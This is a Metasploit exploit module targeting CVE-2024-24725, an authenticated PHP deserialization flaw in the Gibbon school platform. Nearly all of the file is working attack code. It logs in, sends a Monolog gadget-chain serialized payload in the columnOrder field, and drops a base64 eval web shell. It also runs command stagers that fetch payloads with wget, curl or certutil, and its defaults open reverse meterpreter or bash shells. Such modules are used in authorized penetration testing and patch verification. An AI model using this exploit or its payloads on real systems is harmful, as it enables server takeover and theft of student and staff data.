##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gibbon School Platform Authenticated PHP Deserialization Vulnerability',
        'Description' => %q{
          A Remote Code Execution vulnerability in Gibbon online school platform version 26.0.00 and lower
          allows remote authenticated users to conduct PHP deserialization attacks via columnOrder in a
          POST request to the endpoint `/modules/System%20Admin/import_run.php&type=externalAssessment&step=4`.
          As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands,
          potentially resulting in complete system compromise, data exfiltration, or unauthorized access
          to sensitive information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Ali Maharramli', # SecondX.io Research Team - discovery of the vulnerability
          'Fikrat Guliev', # SecondX.io Research Team - discovery of the vulnerability
          'Islam Rzayev' # SecondX.io Research Team - discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-24725'],
          ['URL', 'https://attackerkb.com/topics/ogKGAB44BP/cve-2024-24725'],
          ['PACKETSTORM', '177635'],
          ['EDB', '51903']
        ],
        'DisclosureDate' => '2024-03-18',
        'Platform' => ['php', 'unix', 'linux', 'win'],
        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'curl', 'bourne', 'printf', 'echo'],
              'Linemax' => 16384,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :windows_dropper,
              'Linemax' => 16384,
              'CmdStagerFlavor' => ['psh_invokewebrequest', 'vbs', 'debug_asm', 'debug_write', 'certutil'],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The Gibbon online school platform endpoint URL', '/' ]),
      OptString.new('WEBSHELL', [false, 'Set webshell name without extension. Name will be randomly generated if left unset.', nil]),
      OptString.new('USERNAME', [true, 'Gibbon username to login, typically an e-mail address']),
      OptString.new('PASSWORD', [true, 'Password'])
    ])
  end

  def gibbon_login
    # construct multipart login form data
    form_data = Rex::MIME::Message.new
    form_data.add_part('', nil, nil, 'form-data; name="address"')
    form_data.add_part('default', nil, nil, 'form-data; name="method"')
    form_data.add_part(datastore['USERNAME'].to_s, nil, nil, 'form-data; name="username"')
    form_data.add_part(datastore['PASSWORD'].to_s, nil, nil, 'form-data; name="password"')
    form_data.add_part('025', nil, nil, 'form-data; name="gibbonSchoolYearID"')
    form_data.add_part('0002', nil, nil, 'form-data; name="gibboni18nID"')

    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login.php?timeout=true'),
      'keep_cookies' => true,
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'data' => form_data.to_s
    })
  end

  def construct_form_data(payload)
    # construct multipart form data with payload
    payload_len = payload.length
    payload_data = "a:2:{i:7;O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\x00*\x00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\x00*\x00handler\";r:3;s:13:\"\x00*\x00bufferSize\";i:-1;s:9:\"\x00*\x00buffer\";a:1:{i:0;a:2:{i:0;s:#{payload_len}:\"#{payload}\";s:5:\"level\";N;}}s:8:\"\x00*\x00level\";N;s:14:\"\x00*\x00initialized\";b:1;s:14:\"\x00*\x00bufferLimit\";i:-1;s:13:\"\x00*\x00processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}i:7;i:7;}"

    form_data = Rex::MIME::Message.new
    form_data.add_part('/modules/System Admin/import_run.php', nil, nil, 'form-data; name="address"')
    form_data.add_part('sync', nil, nil, 'form-data; name="mode"')
    form_data.add_part('N', nil, nil, 'form-data; name="syncField"')
    form_data.add_part('', nil, nil, 'form-data; name="syncColumn"')
    form_data.add_part(payload_data.to_s, nil, nil, 'form-data; name="columnOrder"')
    form_data.add_part('N;', nil, nil, 'form-data; name="columnText"')
    form_data.add_part('%2C', nil, nil, 'form-data; name="fieldDelimiter"')
    form_data.add_part('%22', nil, nil, 'form-data; name="stringEnclosure"')
    form_data.add_part("#{Rex::Text.rand_text_alpha(8..16)}.xlsx", nil, nil, 'form-data; name="filename"')
    form_data.add_part('"External Assessment","Assessment Data","Student","Field Name","Category","Field Name","Result"', nil, nil, 'form-data; name="csvData"')
    form_data.add_part('1', nil, nil, 'form-data; name="ignoreErrors"')
    form_data.add_part('Submit', nil, nil, 'form-data; name="Failed"')
    return form_data
  end

  def upload_webshell(b64_payload)
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : "#{datastore['WEBSHELL']}.php")

    # create webshell with base64 encoded PHP payload
    # works for both windows and linux targets
    php_payload = "echo \"<?php @eval(base64_decode(\'#{b64_payload}\'));?>\" > #{@webshell_name}"
    form_data = construct_form_data(php_payload)

    # upload webshell
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php?q=/modules/System%20Admin/import_run.php&type=externalAssessment&step=4'),
      'keep_cookies' => true,
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'data' => form_data.to_s
    })
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    res = upload_webshell(payload)
    fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200
    register_file_for_cleanup(@webshell_name)

    # execute webshell
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, @webshell_name),
      'keep_cookies' => true
    })
  end

  def execute_command(cmd, _opts = {})
    form_data = construct_form_data(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'index.php?q=/modules/System%20Admin/import_run.php&type=externalAssessment&step=4'),
      'keep_cookies' => true,
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'data' => form_data.to_s
    })
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path)
    })
    return CheckCode::Unknown('No valid response received from target.') unless res && res.code == 200

    # check if target is running the Gibbon online school platform
    # search for the Gibbon version on the login page
    return CheckCode::Safe('No Gibbon school platform found.') unless res.body.include?('Gibbon')

    # trying to get the version
    version = res.body.match(/Gibbon.*v(\d+\.\d+\.\d+)/)
    version_number = version[0].split('v') unless version.nil?
    if version_number
      if Rex::Version.new(version_number[1]) <= Rex::Version.new('26.0.00')
        return CheckCode::Appears("Gibbon v#{version_number[1]}")
      else
        return CheckCode::Safe("Gibbon v#{version_number[1]}")
      end
    end
    CheckCode::Detected
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    res = gibbon_login
    fail_with(Failure::NoAccess, "Login failed with user #{datastore['USERNAME']} and password #{datastore['PASSWORD']}.") unless res && res.code == 302

    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd, :windows_cmd
      execute_command(payload.encoded)
    when :linux_dropper, :windows_dropper
      # don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end
  end
end
